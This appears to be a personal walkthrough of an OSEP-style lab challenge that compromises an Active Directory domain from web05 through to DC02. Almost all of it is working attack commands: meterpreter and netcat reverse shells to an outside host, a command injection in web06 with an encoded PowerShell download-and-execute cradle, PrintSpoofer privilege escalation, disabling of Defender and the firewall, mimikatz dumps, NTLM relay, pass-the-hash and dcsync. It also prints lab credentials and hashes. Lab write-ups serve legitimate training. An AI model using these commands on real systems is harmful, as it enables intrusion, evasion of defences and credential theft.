# Challenge 6

## Hosts

### External

192.168.100.181

192.168.100.189

### Internal

172.16.100.180

172.16.100.188

172.16.100.187

172.16.100.184

172.16.100.183

172.16.100.192

172.16.100.194

172.16.100.197

## web05

{% code overflow="wrap" %}
```powershell
# Connect to development host
remmina rdp://192.168.x.100
# Map network drive
net use x: \\192.168.49.204\visualstudio /user:kali @WSX2wsx
# Open "X:\OSEP\EncryptedShellCodeRunnerHelper\EncryptedShellCodeRunnerHelper.sln"
# Craft Malicious ASPX shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.204 LPORT=443 -f csharp
# Paste shellcode into EncryptedShellCodeRunnerHelper
# Execute binary
X:\OSEP\EncryptedShellCodeRunnerHelper\EncryptedShellCodeRunnerHelper\bin\x64\Release\EncryptedShellCodeRunnerHelper.exe
# Meterpreter reverse shell
use exploit/multi/handler
set lport 443
set payload windows/x64/meterpreter/reverse_https
run
# Upload shell at
http://192.168.100.181/
# Navigate to shell to activate it
192.168.100.181/met.aspx

# Start notepad as a process to migrate into
execute -H -f notepad
# Migrate into notepad process
ps
migrate 1088
shell
# Get flag
cd inetpub
type local.txt
e1f242b2cebc0c6cb79193288d703462
# Create network share and copy across needed files
cd \windows\tasks
net use x: \\192.168.49.204\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\SpoolSample.exe
copy X:\OSEP\ActiveDirectoryExploitation\PrintSpoofer.exe
copy X:\OSEP\ActiveDirectoryExploitation\nc64.exe
copy X:\OSEP\ActiveDirectoryExploitation\adPEAS.ps1
copy X:\OSEP\ActiveDirectoryExploitation\PowerView.ps1
copy X:\OSEP\ActiveDirectoryExploitation\SharpHound.exe
copy X:\OSEP\ActiveDirectoryExploitation\HostRecon.ps1

# Run HostRecon
gc -raw .\HostRecon.ps1 | iex
Invoke-HostRecon
# Start additional shells to carry out the PrintSpoolerNet attack
start /b nc64.exe -e cmd.exe 192.168.49.204 4445

# Privesc
# Creating the pipe server as Network Service account
PrintSpoofer.exe \\.\pipe\test\pipe\spoolss "c:\windows\tasks\nc64.exe -e cmd.exe 192.168.49.204 4446"
# Invoke SpoolSample with forward slash
.\SpoolSample.exe web05 web05/pipe/test

# Dump hashes
# Remove Windows Defender definitions
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Disable Firewall
NetSh Advfirewall set allprofiles state off
# Map drive and copy mimikatz
cd \windows\tasks
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\mimikatz.exe
copy X:\OSEP\ActiveDirectoryExploitation\mimidrv.sys
# Run mimikatz
mimikatz.exe
# Dump 
sekurlsa::logonpasswords
lsadump::secrets
```
{% endcode %}

## Found Credentials

```
adminWebSvc:b0df1cb0819ca0b7d476d4c868175b94
Administrator:9689cee5c72d2ef437de593af89bb4ff
adminWebSvc@final.com:FGjksdff89sdfj

adminWebSvc@final.com:FGjksdff89sdfj
```

## Domain Enumeration

{% code overflow="wrap" %}
```powershell
# Run adPEAS
powershell
gc -raw .\adPEAS.ps1 | iex
Invoke-adPEAS

Domain Name             : final.com
Domain SID              : S-1-5-21-1725955968-4040474791-670206374
Domain Functional Level : Windows 2016
Forest Name             : final.com
Forest Children         : {dev.final.com}
Domain Controller       : dc01.final.com
DC Host Name  : dc01.final.com
DC IP Address : 172.16.204.180
Checking Domain Trusts - Details for Domain 'final.com':
Target Domain Name : dev.final.com
Kerberoastable
sqlsvc03, sqlsvc11


.\SharpHound.exe -c all -d final.com
.\SharpHound.exe -c all -d dev.final.com

# User adminWebSvc@final.com can reset nina's password. 

$SecPassword = ConvertTo-SecureString 'FGjksdff89sdfj' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('final.com\adminWebSvc', $SecPassword)

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $Cred
```
{% endcode %}

## jump03

{% code overflow="wrap" %}
```powershell
# User nina can rdp to jump03 as found in bloodhound
# Setup port forward with metasploit
use post/multi/manage/autoroute
set SUBNET 172.16.100.0
set SESSION 2

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j
run autoroute -s 172.16.100.0/24

net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\winpeas.exe
copy X:\OSEP\ActiveDirectoryExploitation\winPEASany_ofs.exe
# Add registry key for colour
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
# Privesc
# Add below code to adduser.c
#include <stdlib.h>
int main ()
{
int i;
    i = system("net localgroup administrators nina /add");
return 0;
}
# Compile code
i686-w64-mingw32-gcc adduser.c -lws2_32 -o add.exe
# Copy to target
copy X:\OSEP\ActiveDirectoryExploitation\add.exe
# Modify service
sc config SNMPTRAP binpath= "C:\Temp\add.exe"
# Start service
net start snmptrap

# Remove Windows Defender definitions
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Disable Firewall
NetSh Advfirewall set allprofiles state off
net use x: \\192.168.49.204\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\mimikatz.exe
copy X:\OSEP\ActiveDirectoryExploitation\shell2.exe
# Run mimikatz
mimikatz.exe
# Increase privileges
privilege::debug
# Dump 
sekurlsa::logonpasswords
lsadump::secrets
```
{% endcode %}

## Found passwords

```
tommy:89dsfsji43A

```

## Setup Pivot

```bash
use post/multi/manage/autoroute
set SUBNET 172.16.204.0
set session 2

use auxiliary/server/socks_proxy
set SRVPORT 1080
set SRVHOST 127.0.0.1
set version 4a
run -j
```

## ansible06

```bash
# Connect to host
proxychains ssh -i tommy_key tommy@final.com@172.16.204.184
# Privesc
sudo lua -e 'os.execute("/bin/sh")'
# Found ansible server
appserver05.dev.final.com
# Change to ansible user account
su ansiblesvc
# ssh to appserver05.dev.final.com
ssh ansiblesvc@appserver05.dev.final.com
```

## appserver05.dev.final

```
ssh ansiblesvc@appserver05.dev.final.com
sudo su
1ceb334da0ef8eb17c11cdf7a2cc4721
```

## sql03

{% code overflow="wrap" %}
```bash

proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py tommy:89dsfsji43A@172.16.204.187 -port 1433 -windows-auth

proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py tommy:89dsfsji43A@172.16.204.188 -port 1433 -windows-auth

# SQL03 & SQL11
# We can remotely login to SQL03 
proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py tommy:89dsfsji43A@172.16.204.187 -port 1433 -windows-auth
# Start ntlmrelayx to relay to hash to SQL07
proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.204.188
# Run SQL query to so NTLMRelayx can forward the hash
EXECUTE ('master.sys.xp_dirtree "\\192.168.49.204\test"')
# Login remotely using hash
proxychains evil-winrm -i 172.16.100.152 -u administrator -H f097f4c64a2af8f0057015a40367ecd9
```
{% endcode %}

## web06

{% code overflow="wrap" %}
```powershell
127.0.0.1 && curl http://192.168.49.204/nc64.exe -O c:\windows\tasks\nc64.exe
127.0.0.1 && c:\windows\tasks\nc64.exe -e cmd 192.168.49.204 53
# Reverse Shell
127.0.0.12 && powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOA
AuADQAOQAuADIAMAA0AC8AcwBoAGUAbABsADYANAAuAHQAeAB0ACIAKQAgAHwAIABJAEUAWAA=

# Create network share and copy across needed files
cd \windows\tasks
net use x: \\192.168.49.204\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\SpoolSample.exe
copy X:\OSEP\PrintSpooferNet\PrintSpooferNet\bin\x64\Release\PrintSpooferNet.exe
copy X:\OSEP\ActiveDirectoryExploitation\nc64.exe
copy X:\OSEP\ActiveDirectoryExploitation\adPEAS.ps1
copy X:\OSEP\ActiveDirectoryExploitation\PowerView.ps1
copy X:\OSEP\ActiveDirectoryExploitation\SharpHound.exe
copy X:\OSEP\ActiveDirectoryExploitation\HostRecon.ps1

# Start additional shells to carry out the PrintSpoolerNet attack
start /b nc64.exe -e cmd.exe 192.168.49.204 4446

# Privesc
# Creating the pipe server as Network Service account
PrintSpoofer.exe \\.\pipe\test\pipe\spoolss "net user haxor h@x0r123! /add && net localgroup administrators haxor /add"
# Invoke SpoolSample with forward slash
.\SpoolSample.exe web05 web05/pipe/test

# Remove Windows Defender definitions
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Disable Firewall
NetSh Advfirewall set allprofiles state off
# Mimikatz
mimikatz.exe
# Dump 
privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
lsadump::secrets
token::elevate
!+
!processprotect /process:lsass.exe /remove
```
{% endcode %}

```bash
# Found Credentials
apacheSvc@dev.final.com:fgodSDOJFSdjk53df:
sqlsvc01@dev.final.com:FDksld894rkjlsdfg
# Hash Dump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f99529e42ee77dc4704c568ba9320a34:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
setup:1001:aad3b435b51404eeaad3b435b51404ee:42efdb0f0c884f32d51c2d785ea2d174:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1e47acda1887221f618e196e33f3e14d:::

```

## sql03

```
cd \windows\tasks
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\SpoolSample.exe
copy X:\OSEP\ActiveDirectoryExploitation\PrintSpoofer.exe
copy X:\OSEP\ActiveDirectoryExploitation\nc64.exe

start /b nc64.exe -e cmd.exe 192.168.49.100 4446
PrintSpoofer.exe \\.\pipe\test\pipe\spoolss "c:\windows\tasks\nc64.exe -e cmd.exe 192.168.49.100 4445"

.\SpoolSample.exe sql03 sql03/pipe/test

cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Disable Firewall
NetSh Advfirewall set allprofiles state off
```

```
# Creds
sqlsvc03:89sdfDSFksolds34f
# Hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8388d07604009d14cbb78f7d37b9e887:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
setup:1001:aad3b435b51404eeaad3b435b51404ee:1fd7eecf8c3c358597ffe32797ed01e9:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a19e10c7c74cfdbbe0b52b7db1c43025:::
```

sql11

```
evil-winrm -i 172.16.100.188 -u administrator -H 8388d07604009d14cbb78f7d37b9e887

tina:1d4c153225b424290188504b9e0541eb
```

## DC01

```
proxychains evil-winrm -i 172.16.100.180 -u tina -H 1d4c153225b424290188504b9e0541eb

```

```
# Hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0474d3f0a74d30f13f1fec243e8ac3cb:::                                                          
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:405854caaf49b41e0e585369a001f114:::                                                                                                                                                                                                                 
tina:1109:aad3b435b51404eeaad3b435b51404ee:1d4c153225b424290188504b9e0541eb:::                                                                                                                                                                                                                  
nina:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::                                                                                                                                                                                                                  
tommy:1112:aad3b435b51404eeaad3b435b51404ee:5ad27ee8000951e0669fab25f73f9d8a:::                                                                 
sqlsvc03:1113:aad3b435b51404eeaad3b435b51404ee:77f944ff6e0c0ed0c83dcef57bdf9298:::                                                              
sqlsvc11:1114:aad3b435b51404eeaad3b435b51404ee:c0f6442ea39956aebf28219639ba9953:::                                                              
adminWebSvc:1115:aad3b435b51404eeaad3b435b51404ee:b0df1cb0819ca0b7d476d4c868175b94:::                                                           
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:fa761c8c9c26c4721fd0e436a8f3c393:::                                                                 
SQL03$:1116:aad3b435b51404eeaad3b435b51404ee:b106851c42ade4757ee20967889dfa6c:::                                                                
SQL11$:1117:aad3b435b51404eeaad3b435b51404ee:e8922275ec5dadb57425cf3151284f10:::                                                                
WEB05$:1118:aad3b435b51404eeaad3b435b51404ee:e3a5854156348328f12c8f2c8b16412a:::                                                                
JUMP03$:1119:aad3b435b51404eeaad3b435b51404ee:e1e7bbaff9afd64a756f08df12ea789e:::                                                               
ANSIBLE06$:1120:aad3b435b51404eeaad3b435b51404ee:8dcf115b018fb2ce46461807d135d300:::                                                            
DEV$:1103:aad3b435b51404eeaad3b435b51404ee:a4e3e0494296ed6625e2b9ee1959b9d2::: 
```

DC02

```
# Done from DC01
mimikatz.exe
privilege::debug

lsadump::dcsync /domain:final.com /user:Administrator
more \\dc02.dev.final.com\c$\users\administrator\desktop\proof.txt
```

